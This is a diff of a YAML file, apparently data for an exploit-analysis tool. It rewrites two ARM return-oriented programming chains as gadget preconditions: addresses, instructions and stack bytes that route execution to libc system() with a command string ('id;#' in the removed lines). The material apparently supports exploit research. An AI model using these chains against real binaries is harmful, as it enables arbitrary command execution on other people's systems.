@@ -35,86 +35,145 @@ states:
       '0x000120fd': ['0x00']  #
 # Simple ROP Chain (crashing)
 ropchain_simple:
-- instructions:
-  - ['0x0000cf24', f0 8f bd e8, 'pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}', '']
-  postconditions:
+# Gadget 0
+- preconditions:
     regs:
-      r6:   '0xbeffc215'
-      pc:   '0x0000c9b8'
     mems:
-      '0xbeffc215': '0x69'  # 'i'
-      '0xbeffc216': '0x64'  # 'd'
-      '0xbeffc217': '0x3b'  # ';'
-      '0xbeffc218': '0x23'  # '#'
-      '0xbeffc219': '0x00'  #
-      '0xbeffc21a': '0x00'  #
-      '0xbeffc21b': '0x00'  #
-      '0xbeffc21c': '0x00'  #
-- instructions:
+      '0xbeffc884': '0x15'  # [sp+2*4] == cmd
+      '0xbeffc885': '0xc2'
+      '0xbeffc886': '0xff'
+      '0xbeffc887': '0xbe'
+      '0xbeffc89c': '0xb8'  # [sp+8*4] == 0xc9b8
+      '0xbeffc89d': '0xc9'
+      '0xbeffc89e': '0x00'
+      '0xbeffc89f': '0x00'
+  instructions:
+  - ['0x0000cf24', f0 8f bd e8, 'pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}', '']
+# Gadget 1
+- preconditions:
+    regs:
+    mems:
+  instructions:
   - ['0x0000c9b8', '06 00 a0 e1', 'mov r0, r6', '']
   - ['0x0000c9bc', 'b7 f2 ff eb', 'bl #0x94a0', '']
-  postconditions:
-    regs:
-    mems:
 # Advanced ROP Chain (non-crashing)
 ropchain_advanced:
 # Gadget 0
-- instructions:
+- preconditions:
+    regs:
+    mems:
+      '0xbeffc898': '0xc9'  # [sp+7*4] == buf0+10*4
+      '0xbeffc899': '0xc2'
+      '0xbeffc89a': '0xff'
+      '0xbeffc89b': '0xbe'
+      '0xbeffc89c': '0x28'  # [sp+8*4] == 0x9428
+      '0xbeffc89d': '0x94'
+      '0xbeffc89e': '0x00'
+      '0xbeffc89f': '0x00'
+  instructions:
   - ["0x0000cf24", "f0 8f bd e8", "pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}", ""]
-  postconditions:
-    regs:
-      r11:  '0xbeffc2c9'
-      pc:   '0x00009428'
-    mems:
 # Gadget 1
-- instructions:
-  - ["0x00009428", "f0 af 1b e9", "ldmdb r11, {r4, r5, r6, r7, r8, r9, r10, r11, sp, pc}", ""]
-  postconditions:
+- preconditions:
     regs:
-      r5:   '0xbeffc136'
-      sp:   '0xbeffc4e3'
-      pc:   '0x00009eb8'
     mems:
+      '0xbeffc8a4': '0x36'  # [sp+1*4] == cmd
+      '0xbeffc8a5': '0xc1'
+      '0xbeffc8a6': '0xff'
+      '0xbeffc8a7': '0xbe'
+      '0xbeffc8bc': '0xf1'  # [sp+7*4] == buf1+10*4
+      '0xbeffc8bd': '0xc2'
+      '0xbeffc8be': '0xff'
+      '0xbeffc8bf': '0xbe'
+      '0xbeffc8c0': '0xe3'  # [sp+8*4] == buf2
+      '0xbeffc8c1': '0xc4'
+      '0xbeffc8c2': '0xff'
+      '0xbeffc8c3': '0xbe'
+      '0xbeffc8c4': '0xb8'  # [sp+9*4] == 0x9eb8
+      '0xbeffc8c5': '0x9e'
+      '0xbeffc8c6': '0x00'
+      '0xbeffc8c7': '0x00'
+  instructions:
+  - ["0x00009428", "f0 af 1b e9", "ldmdb r11, {r4, r5, r6, r7, r8, r9, r10, r11, sp, pc}", ""]
 # Gadget 2
-- instructions:
+- predonditions:
+    regs:
+    mems:
+      '0xbeffc8e4': '0x7c'  # [sp+7*4] == 0x997c
+      '0xbeffc8e5': '0x99'
+      '0xbeffc8e6': '0x00'
+      '0xbeffc8e7': '0x00'
+  instructions:
   - ["0x00009eb8", "05 00 a0 e1", "mov r0, r5", ""]
   - ["0x00009ebc", "f0 87 bd e8", "pop {r4, r5, r6, r7, r8, r9, r10, pc}", ""]
-  postconditions:
-    regs:
-      r3:   '0x00000000'
-      pc:   '0x0000997c'
-    mems:
 # Gadget 3
-- instructions:
+- preconditions:
+    regs:
+    mems:
+      '0xbeffc8e8': '0xa0'  # [sp+0*4] == libc_system
+      '0xbeffc8e9': '0x94'
+      '0xbeffc8ea': '0x00'
+      '0xbeffc8eb': '0x00'
+      '0xbeffc8ec': '0x84'  # [sp+1*4] == 0x9984
+      '0xbeffc8ed': '0x99'
+      '0xbeffc8ee': '0x00'
+      '0xbeffc8ef': '0x00'
+  instructions:
   - ["0x0000997c", "00 00 53 e3", "cmp r3, #0", ""]
   - ["0x00009980", "08 80 bd 08", "popeq {r3, pc}", ""]
-  postconditions:
-    regs:
-      r3:   '0x000094a0'
-      pc:   '0x00009984'
-    mems:
 # Gadget 4
-- instructions:
+- preconditions:
+    regs:
+    mems:
+      '0xbeffc944': '0x28'  # [sp+1*4] == 0x9428
+      '0xbeffc945': '0x94'
+      '0xbeffc946': '0x00'
+      '0xbeffc947': '0x00'
+  instructions:
   - ["0x00009984", "33 ff 2f e1", "blx r3", ""]
   - ["0x00009988", "08 80 bd e8", "pop {r3, pc}", ""]
-  postconditions:
-    regs:
-      r11:  '0xbeffc2f1'
-      pc:   '0x00009428'
-    mems:
 # Gadget 5
-- instructions:
-  - ["0x00009428", "f0 af 1b e9", "ldmdb r11, {r4, r5, r6, r7, r8, r9, r10, r11, sp, pc}", ""]
-  postconditions:
+- preconditions:
     regs:
-      r4:   '0x0001b850'
-      r5:   '0xbeffe9c0'
-      r6:   '0x64ae6532'
-      r7:   '0xbeffedc0'
-      r8:   '0x64ae6532'
-      r9:   '0xbeffe5c0'
-      r10:  '0x00021ae0'
-      r11:  '0xbeffddc0'
-      sp:   '0xbeffc8a0'
-      pc:   '0x0000f1a4'
     mems:
+      '0xbeffc948': '0x50'  # [sp+0*4] == 0x1bb850
+      '0xbeffc949': '0xb8'
+      '0xbeffc94a': '0x1b'
+      '0xbeffc94b': '0x00'
+      '0xbeffc94c': '0xc0'  # [sp+1*4] == 0xbeffe9c0
+      '0xbeffc94d': '0xe9'
+      '0xbeffc94e': '0xff'
+      '0xbeffc94f': '0xbe'
+      '0xbeffc950': '0x32'  # [sp+2*4] == 0x64ae6532
+      '0xbeffc951': '0x65'
+      '0xbeffc952': '0xae'
+      '0xbeffc953': '0x64'
+      '0xbeffc954': '0xc0'  # [sp+3*4] == 0xbeffedc0
+      '0xbeffc955': '0xed'
+      '0xbeffc956': '0xff'
+      '0xbeffc957': '0xbe'
+      '0xbeffc958': '0x32'  # [sp+4*4] == 0x64ae6532
+      '0xbeffc959': '0x65'
+      '0xbeffc95a': '0xae'
+      '0xbeffc95b': '0x64'
+      '0xbeffc95c': '0xc0'  # [sp+5*4] == 0xbeffe5c0
+      '0xbeffc95d': '0xe5'
+      '0xbeffc95e': '0xff'
+      '0xbeffc95f': '0xbe'
+      '0xbeffc960': '0xe0'  # [sp+6*4] == 0x021ae0
+      '0xbeffc961': '0x1a'
+      '0xbeffc962': '0x02'
+      '0xbeffc963': '0x00'
+      '0xbeffc964': '0xc0'  # [sp+7*4] == 0xbeffddc0
+      '0xbeffc965': '0xdd'
+      '0xbeffc966': '0xff'
+      '0xbeffc967': '0xbe'
+      '0xbeffc968': '0xa0'  # [sp+8*4] == 0xbeffc8a0
+      '0xbeffc969': '0xc8'
+      '0xbeffc96a': '0xff'
+      '0xbeffc96b': '0xbe'
+      '0xbeffc96c': '0xa4'  # [sp+9*4] == 0xf1a4
+      '0xbeffc96d': '0xf1'
+      '0xbeffc96e': '0x00'
+      '0xbeffc96f': '0x00'
+  instructions:
+  - ["0x00009428", "f0 af 1b e9", "ldmdb r11, {r4, r5, r6, r7, r8, r9, r10, r11, sp, pc}", ""]
